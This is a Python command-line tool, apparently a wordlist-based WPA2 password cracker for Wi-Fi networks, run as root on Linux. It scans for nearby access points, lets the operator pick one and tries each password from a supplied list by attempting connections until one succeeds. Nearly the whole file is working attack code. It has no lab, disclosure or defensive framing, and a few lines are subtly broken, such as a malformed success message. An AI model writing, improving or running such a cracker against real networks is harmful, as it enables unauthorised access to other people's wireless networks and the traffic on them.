#!/usr/bin/env python3

import _wifiutil_linux as wifiutil
from time import sleep
import os

# Define interface status.
IFACE_DISCONNECTED = 0
IFACE_SCANNING = 1
IFACE_INACTIVE = 2
IFACE_CONNECTING = 3
IFACE_CONNECTED = 4

# Define auth algorithms.
AUTH_ALG_OPEN = 0
AUTH_ALG_SHARED = 1

# Define auth key mgmt types.
AKM_TYPE_NONE = 0
AKM_TYPE_WPA = 1
AKM_TYPE_WPAPSK = 2
AKM_TYPE_WPA2 = 3
AKM_TYPE_WPA2PSK = 4
AKM_TYPE_UNKNOWN = 5

# Define ciphers.
CIPHER_TYPE_NONE = 0
CIPHER_TYPE_WEP = 1
CIPHER_TYPE_TKIP = 2
CIPHER_TYPE_CCMP = 3
CIPHER_TYPE_UNKNOWN = 4

KEY_TYPE_NETWORKKEY = 0
KEY_TYPE_PASSPHRASE = 1

if os.name != 'posix':
    raise NotImplementedError("This cracker isn't supported on this os.")

def clear(message:str = None):
  os.system('clear')
  if message != None: print(message)

set_title = lambda title : print(f'\33]0;{title}\a', end='', flush=True)

class WiFi:
    """This class provides operations to manipulate wifi devices."""

    def interfaces(self):
        """Collect the available wlan interfaces."""

        self._ifaces = []
        wifi_ctrl = wifiutil.WifiUtil()

        for interface in wifi_ctrl.interfaces():
            iface = Interface(interface)
            self._ifaces.append(iface)

        if not self._ifaces:
            "Can't get wifi interface"

        return self._ifaces

class Profile():
    
    def __init__(self):

        self.id = 0
        self.auth = AUTH_ALG_OPEN
        self.akm = [AKM_TYPE_NONE]
        self.cipher = CIPHER_TYPE_NONE
        self.ssid = None
        self.bssid = None
        self.key = None

    def process_akm(self):

        if len(self.akm) > 1:
            self.akm = self.akm[-1:]

    def __eq__(self, profile):

        if profile.ssid:
            if profile.ssid != self.ssid:
                return False

        if profile.bssid:
            if profile.bssid != self.bssid:
                return False

        if profile.auth:
            if profile.auth!= self.auth:
                return False

        if profile.cipher:
            if profile.cipher != self.cipher:
                return False

        if profile.akm:
            if set(profile.akm).isdisjoint(set(self.akm)):
                return False

        return True

class Interface:
    """Interface provides methods for manipulating wifi devices."""

    """
    For encapsulating OS dependent behavior, we declare _raw_obj here for
    storing some common attribute (e.g. name) and os attributes (e.g. dbus
    objects for linux)
    """
    _raw_obj = {}
    _wifi_ctrl = {}
    _logger = None

    def __init__(self, raw_obj):

        self._raw_obj = raw_obj
        self._wifi_ctrl = wifiutil.WifiUtil()

    def name(self):
        """"Get the name of the wifi interfacce."""

        return self._raw_obj['name']

    def scan(self):
        """Trigger the wifi interface to scan."""

        self._wifi_ctrl.scan(self._raw_obj)

    def scan_results(self):
        """Return the scan result."""
        
        return self._wifi_ctrl.scan_results(self._raw_obj)

    def add_network_profile(self, params):
        """Add the info of the AP for connecting afterward."""

        return self._wifi_ctrl.add_network_profile(self._raw_obj, params)

    def remove_network_profile(self, params):
        """Remove the specified AP settings."""

        self._wifi_ctrl.remove_network_profile(self._raw_obj, params)

    def remove_all_network_profiles(self):
        """Remove all the AP settings."""

        self._wifi_ctrl.remove_all_network_profiles(self._raw_obj)

    def network_profiles(self):
        """Get all the AP profiles."""

        return self._wifi_ctrl.network_profiles(self._raw_obj)

    def connect(self, params):
        """Connect to the specified AP."""

        self._wifi_ctrl.connect(self._raw_obj, params)

    def disconnect(self):
        """Disconnect from the specified AP."""

        self._wifi_ctrl.disconnect(self._raw_obj)

    def status(self):
        """Get the status of the wifi interface."""

        return self._wifi_ctrl.status(self._raw_obj)

class main():
    
    status = True
  
    def __init__(self):
        
        set_title("WiFi Cracker")

        try:
            self.wifi = WiFi()
            self.interface = self.wifi.interfaces()[0]  # Select First Wireless Interface Card
            self.banner()
        except FileNotFoundError: exit("Turn on WiFi!")

        otk = ' ' * (self.tw // 4 - 7)
        if len(otk) >= 15: otk = otk[0:-11]

        print(f"\r{otk[0:len(otk)//2]}[*] Scanning ... ", end='', flush=True)
        self.APs = self.scan()
        print(f"\r{otk[0:len(otk)//2]}[*] Scanned"+' '*6, end='', flush=True)

        print(f"\r{otk[0:len(otk)//2]}[*] choose of the SSIDs below :", end='\n', flush=True)

        for i in range(len(self.APs)):
            print(f"\n{otk}[{i+1}] {self.APs[i].ssid}")
            sleep(.06)
        
        print(f"\n{otk[0:(len(otk)//2)]}[*] press enter to refresh \n")
    
        while True:
            try:
                inp = self.input('ssid')
                if inp == '': self.__init__()
                else:
                    index = int(inp)
                    target = self.APs[index - 1]

                    print(f"\n  @SSID : {target.ssid}\n")

                    passlist , stat = self.Getpwl() # PassWord List

                    if stat :
                        try:
                            for password in passlist.readlines() :
                                password = password.strip("\n")
                                if len(password) < 8 or len(password) > 64:
                                    print(f"\n   [!] password structure is incorrect! : {password}")
                                    continue
                                
                                print("\n  [*] Testing : {}".format(password))
                                
                                if self.TcWifi(target.ssid , password) : # Test for connection using password
                                    print("\n{self.dwb  [#] PASSWORD found : %s \n%s" % (password, self.dwb))
                                    self.status = False
                                    break

                            if self.status: print(f"\n   [!] password was not found in password-list!\n")
                        except: ...
                    else:
                        print(f"\n   [!] Could not open file! \n")

            except IndexError:
                print(f"\n   [!] SSID name is incorrect! or lost ...\n")
                continue

            except ValueError:
                print(f"\n   [!] input is incorrect!\n")
                continue
            
            except EOFError:
                print()
                continue

    def banner(self):
        self.tw = os.get_terminal_size()[0]
        self.dwb = ('-' * (self.tw - 2)).center(self.tw, ' ')+'\n'
        qwb = (' ' * (self.tw - 18)) + '(Ctrl+C to quit)'
        clear(self.dwb + ' WiFi Cracker '.center(self.tw,' ') + '\n' + self.dwb + qwb)

    def input(self, dir, iw=1): return input(f"{' '*iw+'@WFC:'f'~/{dir}'} $ ").strip()

    def Getpwl(self):
        data = self.input(f'pwl (_file) ', 2)
        try:return(open(data), True)
        except:return(None, False)


    def scan(self):
        "For Scan the area"
        try:
            self.interface.scan()
            return self.interface.scan_results()
        except: ...
  
    def TcWifi(self, ssid , password):
        self.interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = AUTH_ALG_OPEN
        profile.akm.append(AKM_TYPE_WPA2PSK) # AM_TYPE_WPA2PSK
        profile.cipher = CIPHER_TYPE_CCMP
        profile.key = password
        self.interface.connect(self.interface.add_network_profile(profile))
        if self.interface.status() == IFACE_CONNECTED:
            self.interface.remove_network_profile(profile)
            return True
        else:
            self.interface.remove_network_profile(profile)
            return False

if __name__ == '__main__':
    try: main() if os.geteuid() == 0 else quit('sudo python3 cracker.py')
    except KeyboardInterrupt: clear()
